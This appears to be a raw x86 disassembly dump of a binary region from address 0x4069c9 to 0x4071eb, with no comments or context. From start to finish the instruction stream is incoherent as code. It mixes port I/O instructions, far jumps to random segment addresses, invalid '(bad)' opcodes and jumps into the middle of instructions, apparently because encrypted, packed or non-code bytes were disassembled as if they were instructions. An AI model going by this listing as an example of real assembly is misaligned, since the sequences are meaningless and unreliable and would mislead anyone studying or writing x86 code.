  4069c9:	call   0x1127c24b
  4069ce:	mul    DWORD PTR [ecx+0x684e9fc0]
  4069d4:	cwde   
  4069d5:	mov    edi,0x5fa4cca1
  4069da:	je     0x40697b
  4069dc:	dec    DWORD PTR [ebx+0x4d44d49f]
  4069e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4069e3:	mov    ah,BYTE PTR [edx]
  4069e5:	out    0x6b,eax
  4069e7:	pop    esi
  4069e8:	addr16 pop eax
  4069ea:	or     BYTE PTR [ecx+eiz*8+0x5c],cl
  4069ee:	ds into 
  4069f0:	sbb    edi,edx
  4069f2:	push   edi
  4069f3:	jle    0x406a48
  4069f5:	cld    
  4069f6:	inc    eax
  4069f7:	stos   DWORD PTR es:[edi],eax
  4069f8:	or     ch,al
  4069fa:	test   al,0x83
  4069fc:	mov    BYTE PTR [edi-0x4e],dh
  4069ff:	mov    ecx,0x3159a3eb
  406a04:	out    dx,eax
  406a05:	into   
  406a06:	retf   0x65e0
  406a09:	retf   0xd596
  406a0c:	pop    ss
  406a0d:	cdq    
  406a0e:	jmp    FWORD PTR [eax]
  406a10:	mov    edx,0x1bbd3361
  406a15:	add    al,0x43
  406a17:	push   ebp
  406a18:	sbb    DWORD PTR [edi-0x7bc1e742],ecx
  406a1e:	out    0x75,al
  406a20:	rcr    al,cl
  406a22:	pusha  
  406a23:	jo     0x406a7e
  406a25:	jmp    0xd4539a5b
  406a2a:	add    eax,0x1637ff63
  406a2f:	rcr    BYTE PTR ss:0x16d06169,0x79
  406a37:	cwde   
  406a38:	dec    esi
  406a39:	retf   0x8048
  406a3c:	fwait
  406a3d:	sbb    DWORD PTR [ebx-0x4590c1c2],esp
  406a43:	enter  0xfad5,0xa7
  406a47:	int    0xcb
  406a49:	mov    ecx,DWORD PTR [ecx+0x69]
  406a4c:	js     0x406a3f
  406a4e:	pop    esi
  406a4f:	xchg   ebx,eax
  406a50:	jmp    0x9b81:0x8c6f2346
  406a57:	cmp    eax,0x31362381
  406a5c:	in     al,0x8a
  406a5e:	sahf   
  406a5f:	and    DWORD PTR [edx+0x19],ebx
  406a62:	or     BYTE PTR [esi-0x6a],dh
  406a65:	pop    esp
  406a66:	push   ebx
  406a67:	dec    esp
  406a68:	mov    ds,WORD PTR [ebx+0x1ae652ba]
  406a6e:	mov    ds:0xe1c7679d,eax
  406a73:	cmp    eax,edi
  406a75:	jecxz  0x406ab6
  406a77:	mov    bl,dh
  406a79:	jmp    0x406a03
  406a7b:	dec    ebp
  406a7c:	aad    0xb8
  406a7e:	lock jmp 0x2649d96f
  406a84:	xor    ebx,ebp
  406a86:	lea    ebp,[edi-0x4c]
  406a89:	and    ecx,DWORD PTR [esi+0x42]
  406a8c:	sub    bl,BYTE PTR [edi]
  406a8e:	fwait
  406a8f:	push   esp
  406a90:	cwde   
  406a91:	push   ecx
  406a92:	mov    BYTE PTR [esi+eax*4],cl
  406a95:	mov    dh,0x1
  406a97:	and    BYTE PTR ds:0x64b3947a,dh
  406a9d:	fwait
  406a9e:	gs cmp eax,ecx
  406aa1:	ins    BYTE PTR es:[edi],dx
  406aa2:	mov    cs,ecx
  406aa4:	stos   BYTE PTR es:[edi],al
  406aa5:	leave  
  406aa6:	in     eax,dx
  406aa7:	imul   edx,DWORD PTR [esi+0x3e],0xffffff89
  406aab:	or     BYTE PTR [esi],ch
  406aad:	mov    dh,al
  406aaf:	dec    edx
  406ab0:	loope  0x406a7c
  406ab2:	fdivr  DWORD PTR [eax-0x7d84a4c8]
  406ab8:	iret   
  406ab9:	push   ss
  406aba:	jl     0x406aa5
  406abc:	adc    al,0xe7
  406abe:	dec    ecx
  406abf:	out    0xd6,al
  406ac1:	mov    dl,0x42
  406ac3:	addr16 mov ebx,0xce3a3bb
  406ac9:	in     eax,0x7e
  406acb:	mov    ah,0x31
  406acd:	jg     0x406ad8
  406acf:	jo     0x406aeb
  406ad1:	out    dx,al
  406ad2:	xchg   ebx,eax
  406ad3:	push   eax
  406ad4:	xchg   edx,eax
  406ad5:	push   esp
  406ad6:	call   0xd59a30a1
  406adb:	das    
  406adc:	jmp    0x91c4:0x49064453
  406ae3:	adc    ebx,DWORD PTR [edx+0x6599fe32]
  406ae9:	xor    eax,0xb484e4b9
  406aee:	sub    DWORD PTR [ecx+0x71],eax
  406af1:	sbb    eax,0xfbfe3321
  406af6:	mov    al,0x4a
  406af8:	mov    dl,BYTE PTR [ecx]
  406afa:	test   al,0xc5
  406afc:	(bad)  
  406afe:	and    BYTE PTR [eax-0x4c320e62],al
  406b04:	xchg   DWORD PTR [edx],esi
  406b06:	es xchg ecx,eax
  406b08:	test   DWORD PTR [edi+ecx*1-0x47],0xf90c5275
  406b10:	clc    
  406b11:	icebp  
  406b12:	push   eax
  406b13:	lock mov ebp,DWORD PTR [edx]
  406b16:	bound  ecx,QWORD PTR [ebx-0x46]
  406b19:	xor    BYTE PTR ds:0xf3c24eea,bl
  406b1f:	(bad)  
  406b20:	sub    bh,dl
  406b22:	xchg   esp,eax
  406b23:	hlt    
  406b24:	cmp    ecx,0xffffffec
  406b27:	out    dx,al
  406b28:	dec    esp
  406b29:	mov    bl,0xcb
  406b2b:	cmp    dh,BYTE PTR [edx-0x56]
  406b2e:	mov    eax,ds:0xdb6c55bd
  406b33:	aam    0x74
  406b35:	pop    ds
  406b36:	bound  edx,QWORD PTR [ebx]
  406b38:	mov    eax,0xae6f02f2
  406b3d:	push   ecx
  406b3e:	mov    dh,0x6a
  406b40:	and    DWORD PTR [eax-0x4d57402b],ebx
  406b46:	sub    edx,DWORD PTR [esi]
  406b48:	popa   
  406b49:	rcr    DWORD PTR [eax],0xe7
  406b4c:	lahf   
  406b4d:	sub    eax,0xea69a810
  406b52:	xchg   ecx,eax
  406b53:	iret   
  406b54:	(bad)
  406b58:	and    DWORD PTR [edx-0x5],0x10
  406b5c:	ret    
  406b5d:	push   0xfe729316
  406b62:	ds jne 0x406bc5
  406b65:	js     0x406bba
  406b67:	mov    al,0xc6
  406b69:	nop
  406b6a:	and    al,0xe5
  406b6c:	push   eax
  406b6d:	xchg   ebp,eax
  406b6e:	clc    
  406b6f:	cli    
  406b70:	imul   edx,edx,0xb875027
  406b76:	imul   edx,DWORD PTR [edx],0x6
  406b79:	mov    cl,0xea
  406b7b:	aas    
  406b7c:	cdq    
  406b7d:	and    eax,DWORD PTR [ebx*1+0x839108b]
  406b84:	and    eax,0x466c9ebb
  406b89:	mov    bh,0xc3
  406b8b:	call   0x36ac5a67
  406b90:	cld    
  406b91:	jb     0x406bbe
  406b93:	push   ss
  406b94:	mov    bl,0xfc
  406b96:	adc    al,0xb6
  406b98:	cli    
  406b99:	rcr    DWORD PTR [edx-0x68],0xe3
  406b9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b9e:	outs   dx,DWORD PTR cs:[esi]
  406ba0:	xor    eax,0x53ba3ded
  406ba5:	jp     0x406bb0
  406ba7:	imul   edi,ebp,0x3a150fc
  406bad:	shl    BYTE PTR ds:0x9b838f84,cl
  406bb3:	addr16 xchg esp,eax
  406bb5:	sbb    esp,DWORD PTR [ebx-0x1db1e92b]
  406bbb:	cmp    DWORD PTR [eax],0xffffffca
  406bbe:	rcr    cl,1
  406bc0:	add    esp,edi
  406bc2:	jo     0x406bd7
  406bc4:	and    ebx,DWORD PTR [esi-0xa]
  406bc7:	fucom  st(2)
  406bc9:	out    dx,al
  406bca:	cmp    DWORD PTR [edi],0xe3037a55
  406bd0:	or     eax,esi
  406bd2:	ss mov esi,0xa675c637
  406bd8:	sub    BYTE PTR [edi+0x7672f006],dh
  406bde:	arpl   sp,si
  406be0:	sub    DWORD PTR [ebx-0x1fff4bc3],edi
  406be6:	and    eax,0xf6b28d7d
  406beb:	fldl2e 
  406bee:	cs fs int 0x14
  406bf2:	call   0x98b1:0xc691bce8
  406bf9:	cwde   
  406bfa:	sti    
  406bfb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406bfc:	fwait
  406bfd:	imul   edi,DWORD PTR [edx],0x60663d10
  406c03:	imul   esp,DWORD PTR [eax],0xffffffeb
  406c06:	mov    ecx,0x4b1c311a
  406c0b:	ret    0x8e44
  406c0e:	lds    ebx,FWORD PTR [edi+0x1f]
  406c11:	jg     0x406bb6
  406c13:	mov    ecx,0xf10a28f1
  406c18:	jbe    0x406c08
  406c1a:	cmp    al,0x91
  406c1c:	pop    ebx
  406c1d:	sub    edx,DWORD PTR [edx]
  406c1f:	or     BYTE PTR [esi],al
  406c21:	mov    esp,0x2f136c52
  406c26:	shl    DWORD PTR [ecx],0x24
  406c29:	outs   dx,BYTE PTR ds:[esi]
  406c2a:	lock fnstsw WORD PTR [ebx+0x7a]
  406c2e:	mov    esi,0x71bbce71
  406c33:	inc    eax
  406c34:	hlt    
  406c35:	mov    WORD PTR [edi-0x1d],?
  406c38:	pushf  
  406c39:	dec    eax
  406c3a:	inc    eax
  406c3b:	mov    esi,0x4a92a477
  406c40:	adc    eax,0x4ef77478
  406c45:	pop    edx
  406c46:	sahf   
  406c47:	jp     0x406cb1
  406c49:	jecxz  0x406c27
  406c4b:	data16 gs ss add ch,ch
  406c50:	test   al,0xbc
  406c52:	pop    ebx
  406c53:	or     eax,0x53075a64
  406c58:	ret    0x78f2
  406c5b:	pop    edx
  406c5c:	pop    ecx
  406c5d:	fidiv  DWORD PTR [edi-0x2e77b537]
  406c63:	vsqrtsd xmm0,xmm6,QWORD PTR [esi]
  406c67:	lods   al,BYTE PTR ds:[esi]
  406c68:	mov    ds:0x9903fd22,eax
  406c6d:	pusha  
  406c6e:	sub    eax,DWORD PTR [edi]
  406c70:	xor    BYTE PTR [eax-0xa61377e],bh
  406c76:	mov    ebx,0x9707beff
  406c7b:	push   cs
  406c7c:	sub    dl,al
  406c7e:	push   0xb9d649e7
  406c83:	lahf   
  406c84:	inc    esi
  406c85:	int3   
  406c86:	push   edi
  406c87:	or     DWORD PTR [esi],esi
  406c89:	fmul   DWORD PTR [ebx-0x6e]
  406c8c:	xor    ah,bh
  406c8e:	es call 0x8155939c
  406c94:	push   es
  406c95:	int    0x4e
  406c97:	stos   DWORD PTR es:[edi],eax
  406c98:	sub    dh,dl
  406c9a:	push   cs
  406c9b:	xchg   edi,eax
  406c9c:	sbb    eax,0xf6d6d1ea
  406ca1:	sbb    esi,0xffffffb4
  406ca4:	out    dx,eax
  406ca5:	shl    DWORD PTR [edi-0x2dd8d84c],1
  406cab:	jge    0x406cc2
  406cad:	mov    edx,DWORD PTR [eax-0xf]
  406cb0:	cmp    DWORD PTR [esi+edx*8+0x1ae13616],eax
  406cb7:	xchg   ecx,eax
  406cb8:	push   edx
  406cb9:	push   es
  406cba:	aaa    
  406cbb:	fsubr  DWORD PTR [edx+0x63]
  406cbe:	sbb    eax,0x5f1bfab7
  406cc3:	jmp    0x406c7f
  406cc5:	neg    DWORD PTR [ecx+0x32281c74]
  406ccb:	popf   
  406ccc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ccd:	cli    
  406cce:	in     al,0xf2
  406cd0:	fnstsw WORD PTR [esp+eax*4+0x24abbb16]
  406cd7:	mov    eax,0x6f712e25
  406cdc:	int    0xf1
  406cde:	xchg   ebp,eax
  406cdf:	jno    0x406cbc
  406ce1:	data16 rcr bl,cl
  406ce4:	adc    al,BYTE PTR [ebp+0x4b]
  406ce7:	xchg   ecx,eax
  406ce8:	aam    0xd3
  406cea:	add    BYTE PTR [eax+eax*4+0x1f],0x40
  406cef:	or     DWORD PTR [eax],edx
  406cf1:	bound  edx,QWORD PTR [eax]
  406cf3:	adc    bl,BYTE PTR [edi+0x6]
  406cf6:	fnstcw WORD PTR [ebx+esi*2+0x54]
  406cfa:	out    0xd3,eax
  406cfc:	mov    eax,ds:0xa72a873c
  406d01:	shl    BYTE PTR [esi-0x5a],0xe9
  406d05:	jmp    0x2a342970
  406d0a:	imul   esi,edx,0xd3fdf30e
  406d10:	pop    ss
  406d11:	je     0x406cbb
  406d13:	adc    ch,ah
  406d15:	pop    edi
  406d16:	(bad)  
  406d17:	jmp    0x7219:0xde221fa6
  406d1e:	jp     0x406cb6
  406d20:	or     ebp,ecx
  406d22:	imul   esi,edx,0x22285c40
  406d28:	dec    eax
  406d29:	pop    ebx
  406d2a:	lods   al,BYTE PTR ds:[esi]
  406d2b:	int3   
  406d2c:	and    eax,0xc1a4de2a
  406d31:	and    ebp,ecx
  406d33:	inc    eax
  406d34:	into   
  406d35:	adc    ch,BYTE PTR [ebx+0x6a43853c]
  406d3b:	bound  ebx,QWORD PTR [edi+0xa5b3a73]
  406d41:	mov    al,ds:0x9271f523
  406d46:	jle    0x406ceb
  406d48:	mov    eax,ebp
  406d4a:	lods   al,BYTE PTR ds:[esi]
  406d4b:	daa    
  406d4c:	xchg   ebp,eax
  406d4d:	jle    0x406d57
  406d4f:	xor    al,0xbd
  406d51:	sub    ch,BYTE PTR [edi-0x7c]
  406d54:	mov    BYTE PTR [edx+0x4cd95dc1],dh
  406d5a:	dec    esp
  406d5b:	(bad)  
  406d5c:	inc    ebp
  406d5d:	sub    eax,0xd6af9df9
  406d62:	mov    ds:0xf6a52bcd,eax
  406d67:	repnz test DWORD PTR [ecx+0x3b],eax
  406d6b:	pusha  
  406d6c:	xchg   BYTE PTR [esi+0x2a],bh
  406d6f:	popf   
  406d70:	push   edi
  406d71:	fidiv  WORD PTR [esi+eiz*8+0x137ea3e2]
  406d78:	dec    ebp
  406d79:	loopne 0x406d8a
  406d7b:	pusha  
  406d7c:	aaa    
  406d7d:	xchg   edi,ebp
  406d7f:	and    DWORD PTR [ebx+0x44884fa1],ecx
  406d85:	or     BYTE PTR [ebp-0x34e397a4],0x9e
  406d8c:	enter  0x1dcf,0xc
  406d90:	mov    ecx,0x5d380b38
  406d95:	jnp    0x406d8c
  406d97:	daa    
  406d98:	sbb    ah,dh
  406d9a:	cmp    BYTE PTR [edi-0x7b],dh
  406d9d:	jne    0x406def
  406d9f:	xchg   edi,eax
  406da0:	add    esp,edx
  406da2:	jbe    0x406e01
  406da4:	hlt    
  406da5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406da6:	push   eax
  406da7:	pushf  
  406da8:	call   FWORD PTR [esi-0x5e7ffcc4]
  406dae:	test   DWORD PTR [ecx+0x19],0xbf83d01a
  406db5:	fs imul esi,edi,0xffffffe0
  406db9:	xor    dh,al
  406dbb:	mov    ds:0xbd13c5bb,eax
  406dc0:	fimul  WORD PTR [ebx-0x7d]
  406dc3:	mov    edx,0xa8ee6c9a
  406dc8:	lahf   
  406dc9:	dec    ecx
  406dca:	mov    esi,0xd7381f38
  406dcf:	push   cs
  406dd0:	cmp    DWORD PTR [ecx],0x41
  406dd3:	arpl   WORD PTR [ebx+0x24d7a0c4],dx
  406dd9:	xchg   DWORD PTR [edi-0x7635fb40],ebp
  406ddf:	shr    BYTE PTR [ecx+0x77635333],cl
  406de5:	mov    ch,0xce
  406de7:	mov    cs,WORD PTR [edx-0x752d4b59]
  406ded:	fsubr  st(2),st
  406def:	xchg   ecx,eax
  406df0:	mov    ch,0x60
  406df2:	adc    ebp,ebx
  406df4:	rcr    BYTE PTR [edi+edi*1+0x31448ba2],0xf5
  406dfc:	add    al,0x8b
  406dfe:	es inc ebx
  406e00:	sahf   
  406e01:	rcr    DWORD PTR [ecx+0x72249999],cl
  406e07:	or     eax,0xb906c9bd
  406e0c:	int3   
  406e0d:	in     eax,0xcf
  406e0f:	jns    0x406e88
  406e11:	dec    DWORD PTR [ebx-0x21]
  406e14:	in     al,0x4d
  406e16:	js     0x406de3
  406e18:	add    DWORD PTR [edi+0x7b],ecx
  406e1b:	dec    ebx
  406e1c:	cs push edi
  406e1e:	out    dx,al
  406e1f:	enter  0xdcf3,0x27
  406e23:	dec    esp
  406e24:	mov    bh,BYTE PTR [esi-0x241d5abe]
  406e2a:	mov    al,ds:0x4a3877db
  406e2f:	sub    BYTE PTR es:[esp+edx*4+0x37],bl
  406e34:	je     0x406e08
  406e36:	ret    0xd808
  406e39:	mov    cl,BYTE PTR [ebx+0x6e1821e5]
  406e3f:	or     al,BYTE PTR [esi]
  406e41:	std    
  406e42:	ins    BYTE PTR es:[edi],dx
  406e43:	lods   eax,DWORD PTR ds:[esi]
  406e44:	retf   0xd6a4
  406e47:	mov    ebx,0x9c76135e
  406e4c:	div    al
  406e4e:	push   es
  406e4f:	xor    eax,0x3726852c
  406e54:	xchg   BYTE PTR ds:0xb4ff2d1e,bh
  406e5a:	jle    0x406df6
  406e5c:	xchg   ebx,eax
  406e5d:	lea    edi,[esi+0x7a]
  406e60:	jnp    0x406e91
  406e62:	pop    ds
  406e63:	test   al,0xa6
  406e65:	jbe    0x406edc
  406e67:	push   esi
  406e68:	into   
  406e69:	fsub   DWORD PTR [eax+ebp*1]
  406e6c:	jns    0x406e44
  406e6e:	ja     0x406ea9
  406e70:	adc    eax,0x4f5f028d
  406e75:	lods   eax,DWORD PTR ds:[esi]
  406e76:	nop
  406e77:	fadd   DWORD PTR [ebx+ebp*8-0x2205c6cc]
  406e7e:	and    DWORD PTR [eax-0x703095cb],edx
  406e84:	pop    ds
  406e85:	loop   0x406e76
  406e87:	sbb    BYTE PTR [ebp-0x47f94041],ch
  406e8d:	pushf  
  406e8e:	dec    ecx
  406e8f:	jno    0x406eed
  406e91:	lds    edx,FWORD PTR [ecx+0x48]
  406e94:	shl    DWORD PTR [edi],0xbe
  406e97:	(bad)  
  406e98:	mov    eax,0xe03afd06
  406e9d:	push   esi
  406e9e:	cs pop esi
  406ea0:	pop    ecx
  406ea1:	or     al,0xb
  406ea3:	mov    bh,0xb0
  406ea5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ea6:	mov    bl,0x83
  406ea8:	xchg   edx,eax
  406ea9:	adc    ecx,DWORD PTR [ecx]
  406eab:	loop   0x406e81
  406ead:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406eae:	scas   al,BYTE PTR es:[edi]
  406eaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406eb0:	mov    ebx,0xe212ad99
  406eb5:	aas    
  406eb6:	inc    eax
  406eb7:	test   eax,0xd896b591
  406ebc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ebd:	mov    eax,ds:0x55858a43
  406ec2:	sub    dh,BYTE PTR [eax-0x28379492]
  406ec8:	rol    BYTE PTR [ebx+0x46],cl
  406ecb:	fucomi st,st(0)
  406ecd:	pop    edx
  406ece:	dec    ebp
  406ecf:	mov    ebp,edi
  406ed1:	(bad)  
  406ed2:	sti    
  406ed3:	in     al,0x8f
  406ed5:	sbb    eax,0xb8639fbd
  406eda:	sub    al,0xb2
  406edc:	jmp    0x406f14
  406ede:	adc    DWORD PTR ds:0xa3d99bdb,0x77bd8140
  406ee8:	sbb    dl,BYTE PTR [eax]
  406eea:	push   cs
  406eeb:	jecxz  0x406ed2
  406eed:	jmp    0x846f:0xa18fd624
  406ef4:	stc    
  406ef5:	jmp    0x406f47
  406ef7:	pop    esp
  406ef8:	push   ebx
  406ef9:	mov    edx,0xa9dd3462
  406efe:	push   0xb3e71732
  406f03:	in     eax,0x7a
  406f05:	gs scas eax,DWORD PTR es:[edi]
  406f07:	xchg   esi,eax
  406f08:	pop    es
  406f09:	push   esi
  406f0a:	sub    al,0x20
  406f0c:	retf   0x92b9
  406f0f:	jbe    0x406e9f
  406f11:	aas    
  406f12:	clc    
  406f13:	call   0xbf0bca15
  406f18:	mov    ebx,DWORD PTR [eax-0x72]
  406f1b:	add    eax,0x461b8d20
  406f20:	jmp    0x406f75
  406f22:	aas    
  406f23:	jmp    0xc36153e8
  406f28:	push   ss
  406f29:	mov    dl,bl
  406f2b:	xor    BYTE PTR [esi-0x5db3a849],0xdf
  406f32:	cli    
  406f33:	push   cs
  406f34:	out    0x6c,al
  406f36:	(bad)  
  406f37:	nop
  406f38:	inc    esi
  406f39:	imul   edi,esi,0xa7b43594
  406f3f:	or     eax,0x3977d612
  406f44:	out    0x26,al
  406f46:	mov    ebx,0x50a388ee
  406f4b:	test   BYTE PTR [ebx+0x6377e770],ch
  406f51:	jne    0x406ee9
  406f53:	push   ebp
  406f54:	push   esi
  406f55:	xor    eax,0x722e9348
  406f5a:	jecxz  0x406f74
  406f5c:	push   ecx
  406f5d:	or     eax,0xd190022b
  406f62:	loopne 0x406f79
  406f64:	scas   al,BYTE PTR es:[edi]
  406f65:	shr    dl,1
  406f67:	pop    es
  406f68:	lds    ebx,FWORD PTR [ebx-0x355b2c84]
  406f6e:	xchg   ebx,eax
  406f6f:	push   0x3f4b381a
  406f74:	ret    0x3ccc
  406f77:	mov    ds:0x8a0a2355,eax
  406f7c:	or     al,0xd2
  406f7e:	push   eax
  406f7f:	xor    DWORD PTR [edx+0x13],esp
  406f82:	sub    al,0xbd
  406f84:	outs   dx,BYTE PTR es:[esi]
  406f86:	mov    ecx,DWORD PTR [ecx*8-0xdd0b3fd]
  406f8d:	xchg   edi,eax
  406f8e:	loop   0x406f12
  406f90:	sub    DWORD PTR [edx],ebp
  406f92:	ret    0x67ee
  406f95:	repnz sbb BYTE PTR [eax-0xfa0510],0xc0
  406f9d:	pop    es
  406f9e:	xchg   esi,eax
  406f9f:	lea    ebx,[edx+0xf]
  406fa2:	test   DWORD PTR [edi],edi
  406fa4:	dec    eax
  406fa5:	lods   eax,DWORD PTR ds:[esi]
  406fa6:	inc    edx
  406fa7:	(bad)  
  406fa8:	mul    DWORD PTR [esi-0x45]
  406fab:	enter  0x3289,0xba
  406faf:	(bad)  
  406fb0:	repnz test al,0x12
  406fb3:	test   al,0x54
  406fb5:	int3   
  406fb6:	mov    al,ds:0x877636bf
  406fbb:	js     0x406fed
  406fbd:	add    DWORD PTR [edi+0x9ede67d],ebp
  406fc3:	imul   eax,DWORD PTR [ecx],0x832c903e
  406fc9:	dec    esp
  406fca:	clc    
  406fcb:	push   edi
  406fcc:	jp     0x406f59
  406fce:	jne    0x406fde
  406fd0:	clc    
  406fd1:	jno    0x407030
  406fd3:	inc    edi
  406fd4:	js     0x406f80
  406fd6:	shr    cl,0x65
  406fd9:	xchg   esp,eax
  406fda:	out    0x9a,al
  406fdc:	neg    bh
  406fde:	mov    dh,0xc9
  406fe0:	mov    bh,0xa3
  406fe2:	inc    eax
  406fe3:	int    0x2d
  406fe5:	add    bl,ch
  406fe7:	ins    BYTE PTR es:[edi],dx
  406fe8:	push   ebp
  406fe9:	fwait
  406fea:	jge    0x407029
  406fec:	ins    DWORD PTR es:[edi],dx
  406fed:	xchg   ecx,eax
  406fee:	fistp  QWORD PTR [ebp-0x69]
  406ff1:	mov    ah,0x7e
  406ff3:	pop    esi
  406ff4:	dec    ebx
  406ff5:	push   edi
  406ff6:	mov    bl,0xaf
  406ff9:	enter  0xa142,0x1b
  406ffd:	push   esp
  406ffe:	add    al,0x54
  407000:	and    ebp,DWORD PTR [ecx]
  407002:	cwde   
  407003:	mov    BYTE PTR [esp+ebx*1+0x25],ah
  407007:	adc    esp,DWORD PTR [ebp-0x7717ee0f]
  40700d:	rol    DWORD PTR [edx-0x4f],1
  407010:	sub    BYTE PTR [edx+0x46],ch
  407013:	inc    edi
  407014:	adc    DWORD PTR [ecx+ebx*8-0x49],esp
  407018:	stos   DWORD PTR es:[edi],eax
  407019:	push   0x6c
  40701b:	iret   
  40701c:	sbb    DWORD PTR [eax+ebp*1+0x6b],esp
  407020:	mov    ?,WORD PTR [ebx+0x36d1641e]
  407026:	nop
  407027:	sbb    al,dh
  407029:	jle    0x406fc7
  40702b:	(bad)  
  40702c:	popa   
  40702d:	xchg   BYTE PTR [eax],ah
  40702f:	daa    
  407030:	pushf  
  407031:	sub    DWORD PTR [ecx-0x10a03a2a],eax
  407037:	rcr    BYTE PTR [eax-0x75],cl
  40703a:	sbb    eax,0x3a5063a1
  40703f:	jecxz  0x407007
  407041:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407042:	repz add edx,eax
  407045:	stos   BYTE PTR es:[edi],al
  407046:	inc    ebp
  407047:	jge    0x406ff1
  407049:	mov    ebp,0x6f3c5ba5
  40704e:	es ins DWORD PTR es:[edi],dx
  407050:	imul   esp,DWORD PTR [ebp-0x38],0xc01631d4
  407057:	sbb    DWORD PTR [ebp+0x78],ebx
  40705a:	in     al,dx
  40705b:	imul   eax,DWORD PTR [ebp+0x210f78c2],0x7c9d0192
  407065:	adc    eax,0x31d19f2e
  40706a:	mov    ch,bl
  40706c:	add    BYTE PTR [edx-0x5],dl
  40706f:	xlat   BYTE PTR ds:[ebx]
  407070:	push   esp
  407071:	lock cmp al,0x82
  407074:	aaa    
  407075:	jecxz  0x40705b
  407077:	cmp    BYTE PTR [edx-0x14560db2],ch
  40707d:	popa   
  40707e:	mov    DWORD PTR [eax+ebp*8-0x389f2b5c],esp
  407085:	nop
  407086:	pushf  
  407087:	mov    edx,0x8f339df2
  40708c:	in     al,0x6f
  40708e:	mov    cl,0xa8
  407090:	aad    0xde
  407092:	or     eax,0xc9d5b385
  407097:	push   edx
  407098:	ret    0xa41b
  40709b:	retf   0x3f9e
  40709e:	lds    edi,FWORD PTR ds:[edx-0x67]
  4070a2:	out    0x6a,eax
  4070a4:	and    bh,bl
  4070a6:	loopne 0x4070bb
  4070a8:	imul   ecx,DWORD PTR [esi+0x6e5a5152],0xffffff81
  4070af:	xor    bl,al
  4070b1:	dec    ebx
  4070b2:	test   DWORD PTR [ebp+0x37e78d9b],0x2941e027
  4070bc:	cmp    BYTE PTR [ebx+eax*8+0x72],al
  4070c0:	mov    ch,0xd3
  4070c2:	push   cs
  4070c3:	into   
  4070c4:	jmp    0x847a:0x797ab624
  4070cb:	jle    0x407129
  4070cd:	cmp    eax,0xff6e5f21
  4070d2:	mov    ebx,0xea1dd953
  4070d7:	loope  0x407153
  4070d9:	inc    ecx
  4070da:	mov    ds:0xd410d8b7,eax
  4070df:	cld    
  4070e0:	mov    ecx,0xd1413358
  4070e5:	pmaddwd mm1,QWORD PTR [ecx+eax*2]
  4070e9:	dec    edx
  4070ea:	rol    DWORD PTR [esi-0xd],0x28
  4070ee:	call   0xa319:0xb1805559
  4070f5:	or     DWORD PTR [esi-0x71],esi
  4070f8:	das    
  4070f9:	int    0x3b
  4070fb:	inc    edi
  4070fc:	ins    DWORD PTR es:[edi],dx
  4070fd:	inc    ebp
  4070fe:	sbb    eax,DWORD PTR [ecx]
  407100:	xchg   BYTE PTR [esi],ch
  407102:	aad    0x71
  407104:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407105:	add    eax,0xf37b80c4
  40710a:	call   0x5feea534
  40710f:	sti    
  407110:	loope  0x4070e6
  407112:	jg     0x407184
  407114:	cmp    BYTE PTR [esi+0x39],cl
  407117:	dec    ebx
  407118:	in     eax,0x34
  40711a:	outs   dx,DWORD PTR ds:[esi]
  40711b:	cmp    bl,BYTE PTR [esi]
  40711d:	js     0x4070a2
  40711f:	push   edx
  407120:	jg     0x407130
  407122:	(bad)  [ebx+0x749e61a9]
  407128:	jnp    0x407159
  40712a:	cmc    
  40712b:	pop    es
  40712c:	mov    al,ds:0x64220350
  407131:	cmp    al,BYTE PTR [ecx]
  407133:	sbb    ch,al
  407135:	add    al,0xc5
  407137:	jns    0x4070da
  407139:	addr16 mov esp,0xf043806b
  40713f:	mov    al,ds:0xa23395fd
  407144:	popa   
  407145:	pop    ecx
  407146:	jp     0x407106
  407148:	push   ebx
  407149:	icebp  
  40714a:	ds mov eax,0x60de32e
  407150:	adc    eax,0xa0044b1c
  407155:	jnp    0x4070e7
  407157:	pop    es
  407158:	sub    bh,bl
  40715a:	rcl    DWORD PTR [eax+0x703b454c],cl
  407160:	mov    al,gs:0xdcf35e79
  407166:	in     al,dx
  407167:	pop    es
  407168:	das    
  407169:	repz jp 0x407162
  40716c:	mov    al,0xc5
  40716e:	mov    bl,BYTE PTR [esi]
  407170:	rcl    DWORD PTR [esi+0x4b],0x47
  407174:	mov    eax,0xe601c6a9
  407179:	xchg   ebp,eax
  40717a:	div    BYTE PTR [esi-0x13a8cd1]
  407180:	inc    ebp
  407181:	xchg   BYTE PTR [ebp+ebp*2-0x2af226aa],ch
  407188:	mov    bl,0xd4
  40718a:	mov    al,ds:0x1e742891
  40718f:	fs or  ax,0xb50e
  407194:	push   eax
  407195:	adc    cl,BYTE PTR [ebx]
  407197:	pop    esi
  407198:	aas    
  407199:	sub    BYTE PTR [eax+0x7],bl
  40719c:	int3   
  40719d:	sub    eax,0x34e0105f
  4071a2:	lods   eax,DWORD PTR ds:[esi]
  4071a3:	jbe    0x407193
  4071a5:	cmp    ebx,esp
  4071a7:	aad    0x73
  4071a9:	bound  esi,QWORD PTR [ebx]
  4071ab:	test   eax,0xa54ffcc9
  4071b0:	mov    edi,0x4f31fe4c
  4071b5:	mov    ecx,0x2af7eaca
  4071ba:	imul   DWORD PTR [edi+0xc32296d]
  4071c0:	mov    ah,0x12
  4071c2:	outs   dx,DWORD PTR ds:[esi]
  4071c3:	imul   edx,DWORD PTR [edx+0x6a],0x76
  4071c7:	add    BYTE PTR [ebp-0x48d1c894],ch
  4071cd:	das    
  4071ce:	in     eax,dx
  4071cf:	xor    eax,0xb147cad1
  4071d4:	and    ecx,DWORD PTR [edi-0x54fa75ac]
  4071da:	sahf   
  4071db:	sbb    al,0x48
  4071dd:	xchg   ecx,eax
  4071de:	add    DWORD PTR [ecx-0x15],esi
  4071e1:	fidivr DWORD PTR [ecx+0x351c7c19]
  4071e7:	icebp  
  4071e8:	pop    edx
  4071e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071ea:	dec    ecx
  4071eb:	xlat   BYTE PTR ds:[ebx]
